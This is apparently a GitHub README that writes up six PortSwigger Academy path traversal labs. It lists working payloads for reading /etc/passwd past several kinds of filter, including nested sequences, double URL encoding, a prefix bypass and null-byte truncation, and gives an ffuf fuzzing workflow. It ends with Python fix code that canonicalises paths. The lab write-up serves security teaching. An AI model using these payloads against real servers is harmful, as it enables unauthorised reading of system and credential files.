# 📁 Path Traversal — Complete Lab Series

<div align="center">

![Category](https://img.shields.io/badge/Category-Path%20Traversal-E74C3C?style=for-the-badge)
![Labs Completed](https://img.shields.io/badge/Labs%20Completed-6%2F6-00C853?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20to%20Practitioner-FF6D00?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-100%25%20Complete-00C853?style=for-the-badge)

**6 labs. Apprentice through Practitioner. All done.**

[![🔗 Main Repository](https://img.shields.io/badge/🔗%20Main%20Repository-black?style=for-the-badge)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs)  [![👤 About Me](https://img.shields.io/badge/👤%20About%20Me-5865F2?style=for-the-badge)](https://github.com/Gurpreet-Singh-offensive-Security)  [![📧 Contact](https://img.shields.io/badge/📧%20Contact-E8562A?style=for-the-badge)](mailto:gskhalsa6245@gmail.com)

</div>

---

Finished all 6 PortSwigger Path Traversal labs. Each one adds a layer of filtering — by Lab 6 you've worked through every major defense variant. Notes below cover what I actually did, including Lab 4 where I used ffuf instead of manual Repeater iteration to find the working encoded payload.

**Tools:** Burp Suite Pro, ffuf  
**Target file across all labs:** `/etc/passwd`  
**Core concept:** App reads files from disk using a user-supplied filename. If the path isn't properly validated after OS resolution, you can escape the intended directory.

---

## Labs

### Apprentice — 1/1

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 1 | [Simple Case](./LAB-1-Path-Traversal.md) | Injected `../../../etc/passwd` directly into the `filename` parameter. No filter, no validation. Server concatenated the base directory with the input, OS resolved the traversal, returned the full `/etc/passwd` contents. Three `../` sequences to reach root from `/var/www/images/`. | Direct Traversal |

---

### Practitioner — 5/5

| # | Lab | What I did | Technique |
|---|-----|-----------|-----------|
| 2 | [Absolute Path Bypass](./LAB-2-Path-Traversal.md) | Standard `../../../etc/passwd` returned 400 — `../` is blocked. Tried `/etc/passwd` directly with no traversal sequences. The filter was only checking for `../` — absolute paths sailed through. On Linux, when a path component starts with `/`, POSIX path resolution discards everything before it. Base directory ignored, file read directly. | Absolute Path |
| 3 | [Non-Recursive Strip Bypass](./LAB-3-Path-Traversal.md) | Both `../` and absolute paths blocked this time. Filter is stripping `../` — but only in a single pass. Constructed `....//` — when the filter strips the inner `../`, the outer `.` and `/` collapse back into `../`. Used `....//....//....//etc/passwd`. Filter strips, reconstructs `../../../etc/passwd`, file read executes. | Nested Sequence |
| 4 | [Double URL Encoding Bypass](./LAB-4-Path-Traversal.md) | Filter URL-decodes input then strips `../`. Used ffuf with a path traversal wordlist instead of manually iterating encoding variants in Repeater — faster and more thorough when filter behavior is unknown. ffuf returned 200 on `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`. Filter decodes `%252e` to `%2e` — doesn't match `../` — passes. Server decodes `%2e` to `.` — traversal restored. Confirmed in Repeater. | Double URL Encoding + ffuf |
| 5 | [Start-of-Path Validation Bypass](./LAB-5-Path-Traversal.md) | Parameter value was `/var/www/images/12.jpg` — full path exposed, which immediately told me the required prefix. Filter checks that the value starts with `/var/www/images`. Supplied `/var/www/images/../../../../etc/passwd` — prefix check passes, traversal sequences after the prefix escape the directory. Four `../` to reach root from three levels deep, plus one absorbed at root. | Prefix Bypass |
| 6 | [Null Byte Extension Bypass](./LAB-6-Path-Traversal.md) | Filter checks that the filename ends with a valid extension (`.png`, `.jpg`). Standard traversal, nested sequences, and double encoding all failed — all for the same reason: `passwd` isn't a valid extension. Used `../../../etc/passwd%00.png`. Extension check sees `.png` at the end and passes. C-level `fopen()` hits the null byte (`\x00`) and terminates the string there — `.png` is silently discarded. OS resolves `../../../etc/passwd`. | Null Byte |

---

## How Each Bypass Works

### Direct Traversal (Lab 1)

No defense. Server does:
```
file_path = "/var/www/images/" + filename
return read(file_path)
```

```
filename = ../../../etc/passwd
resolved = /var/www/images/../../../etc/passwd → /etc/passwd
```

---

### Absolute Path (Lab 2)

Filter blocks `../`. Doesn't block leading `/`.

```
filename = /etc/passwd
os.path.join("/var/www/images/", "/etc/passwd") → "/etc/passwd"
```

POSIX behavior: when a path component starts with `/`, preceding components are discarded. Base directory gone.

---

### Nested Sequence Reconstruction (Lab 3)

Filter strips `../` in a single pass. Doesn't re-check the output.

```
Input:   ....//....//....//etc/passwd
Strip ../ from ....// → ../   (outer dots + slash remain)
Output:  ../../../etc/passwd     ← filter reconstructed what it tried to remove
```

---

### Double URL Encoding (Lab 4)

Filter decodes once then strips `../`. Second decode happens deeper in the stack.

```
Input:   %252e%252e%252f
Decode 1 (filter):  %2e%2e%2f    ← not ../, filter passes
Decode 2 (server):  ../          ← traversal restored
```

**ffuf workflow for this lab:**

```bash
# 1. Copy raw request from Burp Repeater, paste into file, mark injection point
nano ~/Desktop/pathtraversal.txt
# Replace filename value with FUZZ:
# GET /image?filename=FUZZ HTTP/1.1

# 2. Prepare payload wordlist with encoding variants
nano ~/Desktop/payload.txt
# ../../../etc/passwd
# %2e%2e%2f%2e%2e%2fetc/passwd
# %252e%252e%252f%252e%252e%252fetc/passwd
# ....//....//etc/passwd
# [other variants...]

# 3. Run ffuf
ffuf -request ~/Desktop/pathtraversal.txt -request-proto https -w ~/Desktop/payload.txt

# 4. 200 OK on %252e%252e%252f... → confirm in Repeater
```

When filter behavior is unknown and multiple encoding variants are plausible, fuzzing a wordlist is faster than iterating manually. ffuf identifies the working payload in seconds; Repeater confirms it cleanly.

---

### Prefix Bypass (Lab 5)

Filter checks `filename.startswith("/var/www/images")`. Doesn't canonicalize.

```
Input:   /var/www/images/../../../../etc/passwd
Check:   starts with /var/www/images → YES → passes
Resolve: /var/www/images/../../../../etc/passwd → /etc/passwd
```

The base directory leaking in the parameter value (`/var/www/images/12.jpg`) gave away exactly what prefix was needed and how deep the directory was.

---

### Null Byte Truncation (Lab 6)

Filter checks that filename ends with `.png` or `.jpg`. C-level file function terminates on `\x00`.

```
Input:      ../../../etc/passwd%00.png

Validation layer (Python/Java string):
  Sees full string including .png → extension check passes

File read layer (C fopen):
  Hits \x00 → string terminated → .png discarded
  Opens: ../../../etc/passwd → /etc/passwd
```

The split between high-level string handling and C-level file calls is what makes this work. Modern PHP (5.3.4+) and most current frameworks sanitize null bytes before filesystem calls — but legacy systems and C-based applications still hit this.

---

## Bypass Progression — All 6 Labs

| Lab | Defense | Payload | Why It Works |
|-----|---------|---------|--------------|
| 1 | None | `../../../etc/passwd` | No filter |
| 2 | Block `../` | `/etc/passwd` | Absolute path overrides base dir |
| 3 | Strip `../` once | `....//....//....//etc/passwd` | Filter reconstructs what it strips |
| 4 | URL decode then strip | `%252e%252e%252f...` | Second decode restores traversal |
| 5 | Prefix must be `/var/www/images` | `/var/www/images/../../../../etc/passwd` | Traversal after valid prefix |
| 6 | Extension must be `.png`/`.jpg` | `../../../etc/passwd%00.png` | Null byte truncates extension at C level |

Every defense fails for the same underlying reason: it operates on the raw input string and doesn't validate the resolved path. The fix is identical across all six.

---

## Fix

```python
import os

base_dir = "/var/www/images/"
raw_input = request.GET["filename"]

# Reject null bytes before anything else
if '\x00' in raw_input:
    return 400

# Canonicalize — let the OS resolve all ../, symlinks, absolute overrides
canonical = os.path.realpath(os.path.join(base_dir, raw_input))

# Validate the RESOLVED path — not the raw string
if not canonical.startswith(os.path.realpath(base_dir) + os.sep):
    return 400

return open(canonical, "rb").read()
```

`os.path.realpath()` resolves everything before the check runs. The check sees `/etc/passwd`, not `../../../etc/passwd` or any encoded variant of it. Every bypass in this series fails against this implementation.

More robust: don't accept filenames at all. Map user-supplied IDs to server-controlled paths:

```python
IMAGE_MAP = {
    "8":  "/var/www/images/product_8.jpg",
    "12": "/var/www/images/product_12.jpg",
}
path = IMAGE_MAP.get(request.GET["id"])
if path is None:
    return 404
return open(path, "rb").read()
```

No traversal sequence, encoding variant, null byte, or prefix trick can produce a valid dict key. User input never reaches path construction.

---

## Tools

| Tool | What I used it for |
|------|--------------------|
| Burp Suite Pro | Repeater for all labs, HTTP history for attack surface identification |
| ffuf | Lab 4 — fuzzing encoding variants against the filename parameter instead of iterating manually |

---

## Lab Order

Do them in order — each lab adds one defense variant and the bypass technique is informed by understanding why the previous approach fails. Lab 4's ffuf approach is the most transferable skill here; the same workflow applies to any parameter where filter behavior is unknown.

---

## Completion

- [x] Lab 1 — Simple Case
- [x] Lab 2 — Absolute Path Bypass
- [x] Lab 3 — Non-Recursive Strip Bypass
- [x] Lab 4 — Double URL Encoding Bypass (ffuf)
- [x] Lab 5 — Start-of-Path Validation Bypass
- [x] Lab 6 — Null Byte Extension Bypass

---

## Resources

- [PortSwigger Path Traversal Labs](https://portswigger.net/web-security/file-path-traversal)
- [PortSwigger Path Traversal Cheat Sheet](https://portswigger.net/web-security/file-path-traversal#how-to-prevent-a-path-traversal-attack)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
- [ffuf](https://github.com/ffuf/ffuf) — worth learning before Lab 4

Other series in this repo:
- [SQL Injection](../SQL%20Injection/) — 18 labs done
- [Authentication Vulnerabilities](../AUTHENTICATION/) — 14 labs done
- [Web Cache Deception](../web-cache-deception/) — 5 labs done
- XSS — in progress
- Access Control — in progress

---

## Legal

Done entirely on PortSwigger Academy's lab environment. Using any of this against systems you don't own or don't have written permission to test is illegal.

---

<div align="center">

### Gurpreet Singh | Offensive Security Researcher

[![EMAIL](https://img.shields.io/badge/EMAIL-GSKHALSA6245%40GMAIL.COM-EA4335?style=for-the-badge&logo=gmail&logoColor=white)](mailto:gskhalsa6245@gmail.com)

[![GITHUB](https://img.shields.io/badge/GITHUB-GURPREET--SINGH--OFFENSIVE--SECURITY-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) [![LINKEDIN](https://img.shields.io/badge/LINKEDIN-CONNECT-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/gurpreetsingh-security)

**CC BY-NC-ND 4.0 — © 2025 Gurpreet Singh**

</div>
